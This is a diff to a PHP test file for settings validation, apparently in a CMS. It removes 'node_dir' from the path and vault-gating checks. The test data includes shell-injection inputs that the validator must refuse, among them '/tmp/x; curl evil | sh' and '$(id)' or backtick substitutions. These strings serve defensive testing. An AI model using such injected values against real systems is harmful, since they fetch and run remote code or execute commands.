@@ -57,8 +57,8 @@ foreach (['../uploads', 'theme/../x', 'a/b', 'default ', '.hidden', 'x;y'] as $b
 	check(refused_by_declaration('active_theme_plugin', $bad), "active_theme_plugin refuses '$bad'");
 }
 
-section('node_dir, apache_error_log, agent source path: a plain absolute path');
-foreach (['node_dir', 'apache_error_log', 'server_manager_agent_source_path'] as $name) {
+section('apache_error_log, agent source path: a plain absolute path');
+foreach (['apache_error_log', 'server_manager_agent_source_path'] as $name) {
 	check(!refused_by_declaration($name, '/var/www/html/site/node'), "$name accepts a plain absolute path");
 	check(!refused_by_declaration($name, '/var/log/apache2/error.log'), "$name accepts a dotted file name");
 	foreach (['relative/path', '/tmp/x; curl evil | sh', '/tmp/$(id)', '/tmp/a b', '/tmp/`id`', "/tmp/x\n/etc"] as $bad) {
@@ -82,7 +82,7 @@ foreach (['http://getjoinery.com', 'https://getjoinery.com/', 'https://getjoiner
 check(!refused_by_declaration('upgrade_source', ''), "upgrade_source accepts empty, which means no source");
 
 section('Changing one is a credential event');
-foreach (['allowed_upload_extensions', 'composerAutoLoad', 'theme_template', 'active_theme_plugin', 'node_dir', 'server_manager_agent_source_path', 'upgrade_source'] as $name) {
+foreach (['allowed_upload_extensions', 'composerAutoLoad', 'theme_template', 'active_theme_plugin', 'server_manager_agent_source_path', 'upgrade_source'] as $name) {
 	check(SettingsDeclarations::isVaultGated($name), "$name is vault gated");
 }
 
